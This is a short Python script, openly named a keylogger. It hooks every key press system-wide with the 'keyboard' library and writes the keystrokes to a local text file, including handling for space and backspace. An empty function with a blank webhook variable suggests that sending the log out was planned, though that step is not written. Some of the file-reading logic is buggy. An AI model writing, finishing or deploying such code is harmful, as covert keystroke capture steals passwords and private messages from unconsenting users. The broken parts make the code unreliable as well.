import keyboard

txt_name = "keylogger.txt"

def on_key_event(event):
    with open("keylogger.txt" , "r") as file:
        full_txt = file.read()
        lines = file.readlines()
        last_line = 0
        for line in lines:
            last_line = line
            print(line)

    if event.name == "space":
        with open(txt_name, "a") as space:
            space.write(" ")
            return

    if event.name == "backspace":
        caracter_modificado = full_txt[:-1]
        with open(txt_name, "w") as new:
            new.write(caracter_modificado)
            return

    with open(txt_name, "a") as key:
        key.write(f"{event.name}")

    with open("keylogger.txt", "r") as arquivo:

        linhas = arquivo.readlines()

        if linhas:
            ultima_linha = linhas[-1]
            quantidade_caracteres = len(ultima_linha)
            

    if quantidade_caracteres >= 30:
        with open(txt_name, "a") as line:
            line.write("\n")

def msg():
    webhook = ""

keyboard.on_press(on_key_event)
keyboard.wait()